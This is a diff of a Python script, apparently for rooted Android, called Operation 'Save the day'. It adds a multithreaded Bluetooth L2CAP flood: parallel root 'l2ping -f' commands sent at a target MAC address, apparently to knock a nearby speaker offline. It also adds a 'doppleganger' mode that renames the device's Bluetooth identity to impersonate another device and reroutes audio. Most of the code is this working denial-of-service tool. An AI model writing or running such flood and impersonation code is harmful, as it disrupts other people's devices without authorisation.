@@ -1,105 +1,123 @@
 import argparse
-import os
+import subprocess
+import threading
+import time
 
-def attack(mac_address:str): 
+def run_root_command(cmd: list, desc: str = ""):
     try:
-        print(f"*** Proceeding with attacking {mac_address}")
+        full_cmd = ["su", "-c", " ".join(cmd)] if isinstance(cmd, list) else ["su", "-c", cmd]
+        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            print(f"[+] {desc} Success")
+            return True
+        else:
+            print(f"[-] {desc} Failed: {result.stderr.strip()}")
+            return False
     except Exception as e:
-        print(f"[-] Failed to attack: {e}")
+        print(f"[-] {desc} Error: {e}")
+        return False
+
+
+def DOS(mac_address: str, packet_size: str):
+    try:
+        cmd = f"l2ping -i hci0 -s {packet_size} -f {mac_address}"
+        print(f"[+] Flood thread running against {mac_address} ({packet_size} bytes)")
+        subprocess.run(["su", "-c", cmd], check=True, capture_output=True)
+    except Exception as e:
+        print(f"[-] DOS thread error: {e}")
+
+
+def attack(mac_address: str, packet_size: str = "600", threads: int = 5):
+    print(f"*** Starting attack on {mac_address} | Size: {packet_size} | Threads: {threads}")
+    
+    for i in range(threads):
+        t = threading.Thread(target=DOS, args=(mac_address, packet_size), daemon=True)
+        t.start()
+        print(f"[+] Thread {i+1} started")
+    
+    print("[+] All threads launched. Attack running...")
+    print("[*] Press Ctrl+C to stop")
 
 
 def configure_audio_routing(mode: str):
     try:
-        # MODE 1: Bridge / Relay Mode
         if mode == 'bridge':
-            print("*** Routing Matrix: Bridging Input directly to Output ...")
-            
-            # Use Android's native command line utilities to force SCO / Communication routing
-            os.system("adb shell cmd audio set-mode 3") # MODE_IN_COMMUNICATION is 3
-            os.system("adb shell cmd audio set-sco-on true")
-            
+            print("*** Bridging audio (SCO routing)...")
+            run_root_command(["cmd audio set-sco-on true"], "SCO ON")
+            run_root_command(["cmd audio set-mode 3"], "Audio Mode IN_CALL")
             print("[+] Audio bridge active! Wait for pohana myzyka.")
-
-        # MODE 2: Local Audio Priority Mode
         elif mode == 'priority':
-            print("*** Routing Matrix: Severing external input to favor local apps...")
-            
-            # Reset system audio state back to normal media playback via shell
-            os.system("adb shell cmd audio set-sco-on false")
-            os.system("adb shell cmd audio set-mode 0") # MODE_NORMAL is 0
-            
+            print("*** Resetting audio priority...")
+            run_root_command(["cmd audio set-sco-on false"], "SCO OFF")
+            run_root_command(["cmd audio set-mode 0"], "Audio Mode NORMAL")
             print("[+] Audio matrix reset. Local music apps will now rule the device! Save the day!!!")
-
     except Exception as e:
-        print(f"[-] Failed to configure audio routing via system utilities: {e}")
+        print(f"[-] Audio routing failed: {e}")
 
 
-def doppleganger(new_name: str, mode: str):
-    try:
-        print(f"[*] Requesting Bluetooth name update to: {new_name}")
-        
-        # Bypassing the broken local package entirely via your working ADB intent bridge
-        adb_cmd = f"adb shell am broadcast -a com.termux.api.execute --es api_method BluetoothSetName --es name '{new_name}' --user 0"
-        
-        result = os.system(adb_cmd)
-        if result != 0:
-            raise Exception("ADB intent broadcast rejected by system daemon.")
-            
-        print(f"[+] Successfully changed Bluetooth name to: {new_name}")
-        
-        # Trigger the audio routing changes based on your mode selection
-        configure_audio_routing(mode)
-        
-    except Exception as e:
-        print(f"[-] Hardware layer rejected name change or audio configuration: {e}")
-        return
+def doppleganger(new_name: str, mode: str = "bridge"):
+    print(f"[*] Changing Bluetooth name to: {new_name}")
     
-    print("*** Press Ctrl+C to stop the doppleganger.")
-    import time
+    # Method 1: Global setting
+    run_root_command([f"settings put global bluetooth_name '{new_name}'"], "Bluetooth name (global)")
+    run_root_command([f"settings put secure bluetooth_name '{new_name}'"], "Bluetooth name (secure)")
+    
+    # Restart Bluetooth to apply (recommended)
+    run_root_command(["svc bluetooth disable"], "Bluetooth OFF")
+    time.sleep(1)
+    run_root_command(["svc bluetooth enable"], "Bluetooth ON")
+    
+    configure_audio_routing(mode)
+    
+    print("*** Doppleganger active. Press Ctrl+C to stop and restore.")
     try:
         while True:
-            time.sleep(1) 
+            time.sleep(1)
     except KeyboardInterrupt:
         print("\n*** Looks like day was saved so stopping doppleganger and cleaning up...")
-        # Clean up the audio matrix automatically when you exit!
         configure_audio_routing('priority')
+        print("[+] Cleanup done.")
+
 
 def main():
-    parser = argparse.ArgumentParser(
-        description='''Operation "Save the day", script for scanning, creating doppleganger and saving the day from the pohana myzyka. 
-        To use: python [file_name].py -[command] -[argument](if needed)''', add_help=False)
-    
-    parser.add_argument("-h", "--help", action="help", help="Show list of commands with description")
-    parser.add_argument("-scan", action="store_true", help="List devices and exit (ignored)")
-    parser.add_argument("-attack", help="Turning off speaker")
-    parser.add_argument("-mac", help="Targeting some address (with -attack)")
-    parser.add_argument("-dopple", action="store_true", help="Creates a doppleganger of device which relays or streams audio," 
-    " by default relay(bridge)")
+    parser = argparse.ArgumentParser(description='Operation "SAVE THE DAY" ')
 
-    parser.add_argument("-name", type=str, default=None, help="Preferred device name (with -dopple)")
-    parser.add_argument("-mode", type=str, choices=["bridge","priority"], default="bridge",
-                         help="Changes mode of doppleganger function(bridge or priority) (with -dopple)")
+    parser.add_argument("-scan", action="store_true", help="Scan (placeholder)")
+    
+    parser.add_argument("-attack", metavar="MAC", help="Start L2CAP flood")
+    parser.add_argument("-mac", type=str, help="Target MAC address")
+    parser.add_argument("-size", type=str, default="600", help="Packet size (default 600)")
+    parser.add_argument("-thread", type=int, default=5, help="Number of threads (default 5)")
+    
+    parser.add_argument("-dopple", action="store_true", help="Enable Doppleganger mode")
+    parser.add_argument("-name", type=str, default="POMINAY_IMYA", help="New Bluetooth name")
+    parser.add_argument("-mode", choices=["bridge", "priority"], default="bridge", help="Audio mode")
     
 
-    arg = parser.parse_args()
 
-    if arg.scan:
-        print("*** Scan is ignored in this version.")
+    args = parser.parse_args()
+
+    if args.scan:
+        print("[*] Scan not implemented in this version.")
         return
 
-    if arg.attack:
-       attack(arg.mac)
-
-    if arg.dopple:
-        target_name = arg.name or "POMINAY IMYA"
-        doppleganger(target_name, arg.mode)
+    if args.attack:
+        mac = args.attack if not args.mac else args.mac
+        if not mac:
+            print("[-] Please provide MAC with -mac or directly after -attack")
+            return
+        attack(mac, args.size, args.thread)
         return
 
-    print('''*** Welcome to the operation "SAVE THE DAY". No action specified. Use -scan to start or -help for info. ''')
+    if args.dopple:
+        doppleganger(args.name, args.mode)
+        return
 
-if __name__ == '__main__':
+    parser.print_help()
+
+
+if __name__ == "__main__":
     main()
-
 
 
 
